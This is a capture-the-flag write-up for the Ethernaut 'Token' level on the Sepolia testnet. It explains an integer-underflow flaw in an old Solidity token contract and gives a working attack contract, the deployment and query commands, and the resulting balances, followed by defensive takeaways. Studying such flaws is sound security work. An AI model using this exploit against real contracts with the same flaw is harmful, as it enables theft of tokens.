# 05 - Token

## Overview

- **Difficulty:** 3/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC`](https://sepolia.etherscan.io/address/0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC)
- **Attack Contract (`TokenCaller`):** [`0xf011a5F59e22051605B4401Bbbb0CC397bDCBe2e`](https://sepolia.etherscan.io/address/0xf011a5F59e22051605B4401Bbbb0CC397bDCBe2e)
- **Level Submission Tx:** [`0xb78ae9d6452149c6a5b148d6cbdd4da35d7a0cc73ce705b659a844a7331f2ce5`](https://sepolia.etherscan.io/tx/0xb78ae9d6452149c6a5b148d6cbdd4da35d7a0cc73ce705b659a844a7331f2ce5)

---

## Objective

The player starts with 20 tokens. The goal is to hack the token contract and acquire additional tokens (preferably a very large amount).

---

## Contract Analysis

The target contract is [`src/05-Token/Token.sol`](./Token.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

### Vulnerability Breakdown: Integer Underflow & Flawed Validation

The contract is written in Solidity `^0.6.0`. Prior to Solidity version `0.8.0`, arithmetic operations (`+`, `-`, `*`) did not automatically revert on overflow or underflow; integers wrapped around modulo $2^{256}$.

Examining the `transfer` function:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

Two critical flaws exist here:

1. **Flawed `require` Condition (Tautology):**
   - `balances[msg.sender]` and `_value` are unsigned 256-bit integers (`uint256`).
   - The expression `balances[msg.sender] - _value` is evaluated first. If `_value > balances[msg.sender]`, the result wraps around (underflows) to a massive number near $2^{256} - 1$.
   - Because unsigned integers can never be negative, a `uint256` value is **always** $\ge 0$. The check `require(balances[msg.sender] - _value >= 0)` is a tautology and will **always evaluate to `true`**, providing zero balance protection!

2. **Unchecked Arithmetic Underflow:**
   - In `balances[msg.sender] -= _value;`, subtracting more than the current balance underflows directly to $2^{256} - \text{diff}$.

```text
[ TokenCaller Balance ] = 0
                       │
                       ▼  Calls transfer(player, 1)
[ require(0 - 1 >= 0) ] ──▶ Underflows: 2^256 - 1 >= 0 (Evaluates to TRUE!)
                       │
                       ▼  balances[TokenCaller] -= 1
[ TokenCaller Balance ] = 2^256 - 1 (115792089237316195423570985008687907853269984665640564039457584007913129639935)
                       │
                       ▼  balances[player] += 1
[ Player Balance ]      = 20 + 1 = 21 tokens!
```

---

## Attack Contract

The exploit is implemented in [`src/05-Token/TokenCaller.sol`](./TokenCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IToken {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract TokenCaller {
    constructor(address _token) {
        IToken(_token).transfer(msg.sender, 1);
    }
}
```

### Exploit Design: 1-Tx Execution via Constructor

1. When deploying `TokenCaller`, `msg.sender` inside the constructor is the player's wallet address (`0xf511E1029dE5295f6D0dE05f4431DdA203e63607`).
2. The constructor calls `IToken(_token).transfer(msg.sender, 1)`.
3. From the perspective of the `Token` contract, `msg.sender` is the newly deployed `TokenCaller` contract.
4. `TokenCaller` has an initial balance of `0`.
5. The `0 - 1` subtraction underflows to $2^{256} - 1$, passing the `require` check and setting `TokenCaller`'s balance to $2^{256} - 1$.
6. The player receives `1` token, increasing their balance from `20` to `21`.
7. Everything executes atomically in a single deployment transaction.

*(Note: The player could also have triggered the underflow directly from their EOA by transferring 21 tokens to another address, but deploying `TokenCaller` cleanly demonstrates exploiting the underflow from a 0-balance contract).*

---

## Step-by-Step Exploit Walkthrough

### 1. Check Initial Balance

Verify initial token balance of the player:

```bash
cast call 0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC \
  "balanceOf(address)(uint256)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  --rpc-url sepolia
# Output: 20
```

### 2. Deploy the Attack Contract

Deploy `TokenCaller.sol`, passing the `Token` instance address to the constructor:

```bash
forge create src/05-Token/TokenCaller.sol:TokenCaller \
  --constructor-args 0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC \
  --rpc-url sepolia \
  --account <YOUR_ACCOUNT>
```

- **Deployed Address:** [`0xf011a5F59e22051605B4401Bbbb0CC397bDCBe2e`](https://sepolia.etherscan.io/address/0xf011a5F59e22051605B4401Bbbb0CC397bDCBe2e)

### 3. Verify Balances

Check the player's updated balance:

```bash
cast call 0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC \
  "balanceOf(address)(uint256)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  --rpc-url sepolia
# Output: 21
```

Check the `TokenCaller` balance:

```bash
cast call 0x804ceF2ba55E1219D6F4D9c34e648A195a86caFC \
  "balanceOf(address)(uint256)" 0xf011a5F59e22051605B4401Bbbb0CC397bDCBe2e \
  --rpc-url sepolia
# Output: 115792089237316195423570985008687907853269984665640564039457584007913129639935 (type(uint256).max)
```

### 4. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0xb78ae9d6452149c6a5b148d6cbdd4da35d7a0cc73ce705b659a844a7331f2ce5`](https://sepolia.etherscan.io/tx/0xb78ae9d6452149c6a5b148d6cbdd4da35d7a0cc73ce705b659a844a7331f2ce5)

---

## Key Security Takeaways

1. **Solidity 0.8.0+ Default Overflow/Underflow Protection:**
   Starting from Solidity `0.8.0`, arithmetic operations revert automatically on underflow and overflow. In earlier versions (`<0.8.0`), developers must use OpenZeppelin's `SafeMath` library.
2. **Beware of Unsigned Integer Tautologies:**
   Checking `uint >= 0` is meaningless because unsigned integers cannot be negative. If performing validation, compare values before subtraction: `require(balances[msg.sender] >= _value)`.
3. **Legacy Codebase Auditing:**
   When interacting with or maintaining older contracts (pre-0.8.0), always verify whether arithmetic operations use SafeMath or unchecked arithmetic.
